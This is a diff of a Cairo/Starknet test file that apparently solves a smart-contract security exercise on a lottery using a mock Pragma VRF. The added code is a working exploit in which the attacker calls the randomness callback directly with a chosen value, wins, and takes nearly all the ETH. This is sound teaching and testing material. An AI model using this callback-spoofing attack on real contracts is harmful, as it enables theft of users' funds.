@@ -1,6 +1,6 @@
 use ayn_random::lottery::lottery::{ILotteryDispatcher, ILotteryDispatcherTrait};
 use ayn_random::utils::helpers;
-use openzeppelin_token::erc20::interface::{IERC20Dispatcher, IERC20DispatcherTrait};
+use openzeppelin_token::erc20::interface::{IERC20DispatcherTrait};
 use snforge_std::{
     ContractClassTrait, DeclareResultTrait, declare, start_cheat_caller_address,
     stop_cheat_caller_address,
@@ -11,27 +11,21 @@ fn deploy_lottery(
     pragma_vrf: ContractAddress, eth: ContractAddress, treasury: ContractAddress,
 ) -> (ContractAddress, ILotteryDispatcher) {
     let contract_class = declare("Lottery").unwrap().contract_class();
-    let mut data_to_constructor = Default::default();
-    Serde::serialize(@pragma_vrf, ref data_to_constructor);
-    Serde::serialize(@eth, ref data_to_constructor);
-    Serde::serialize(@treasury, ref data_to_constructor);
-    let (address, _) = contract_class.deploy(@data_to_constructor).unwrap();
+    let calldata: Array<felt252> = array![pragma_vrf.into(), eth.into(), treasury.into()];
+    let (address, _) = contract_class.deploy(@calldata).unwrap();
     return (address, ILotteryDispatcher { contract_address: address });
 }
 
 // Deploying a MOCK pragma VRF contract
 // Note: The pragma VRF contract is a mock contract for testing purposes, and not a real VRF
-// contract Note: If there are bugs in this contract, they are out of scope of this exercises :)
 fn deploy_pragma_mock(eth: ContractAddress) -> ContractAddress {
     let contract_class = declare("VRFMock").unwrap().contract_class();
-    let mut data_to_constructor = Default::default();
-    Serde::serialize(@eth, ref data_to_constructor);
-    let (address, _) = contract_class.deploy(@data_to_constructor).unwrap();
+    let (address, _) = contract_class.deploy(@array![eth.into()]).unwrap();
     address
 }
 
 #[test]
-fn test_randomness_2() {
+fn test_vrf_attack() {
     // Accounts
     let attacker: ContractAddress = 'attacker'.try_into().unwrap();
     let treasury: ContractAddress = 'treasury'.try_into().unwrap();
@@ -45,13 +39,8 @@ fn test_randomness_2() {
     helpers::mint_erc20(eth_address, attacker, helpers::one_ether());
 
     // 10 Users buy tickets
-    let mut i: u256 = 1;
-    loop {
-        // Condition to break the loop
-        if i == 11 {
-            break;
-        }
-
+    let mut i: u256 = 1; 
+    while i != 11 {
         // Create a user and mint 1 ETH
         let felt_of_i: felt252 = i.try_into().unwrap();
         let mut user: ContractAddress = felt_of_i.try_into().unwrap();
@@ -62,6 +51,7 @@ fn test_randomness_2() {
         start_cheat_caller_address(eth_address, user);
         eth_dispatcher.approve(lottery, helpers::one_ether());
         stop_cheat_caller_address(eth_address);
+        
         start_cheat_caller_address(lottery, user);
         lottery_dispatcher.buy_ticket();
         stop_cheat_caller_address(lottery);
@@ -70,12 +60,26 @@ fn test_randomness_2() {
     }
 
     // Attack Start //
-    // TODO: Win the lottery and obtain all ETH
+    // Win the lottery and obtain all ETH
+
+    // Buy ticket
+    start_cheat_caller_address(eth_address, attacker);
+    eth_dispatcher.approve(lottery, helpers::one_ether());
+    stop_cheat_caller_address(eth_address);
+    start_cheat_caller_address(lottery, attacker);
+
+    // 
+    lottery_dispatcher.buy_ticket();
+    let calldata: Array<felt252> = array![];
+    lottery_dispatcher.request_winner(1, lottery, 1, 0, 1, calldata.clone());
+    let rands: Array<felt252> = array![10];
+    lottery_dispatcher.receive_random_words(lottery, 0, rands.span(), calldata);
+    stop_cheat_caller_address(lottery);
 
     // Attack End //
 
-    // Attacker should win the lottery and obtain all ETH (>= 9 because some ETH is consumed for VRF
-    // request)
+    // Attacker should win the lottery and obtain all ETH 
+    // (>= 9 because some ETH is consumed for VRF request)
     let winner: felt252 = lottery_dispatcher.get_last_winner().try_into().unwrap();
     println!("Winner: {}", winner);
     assert(eth_dispatcher.balance_of(attacker) >= helpers::one_ether() * 9, 'Not all ETH');
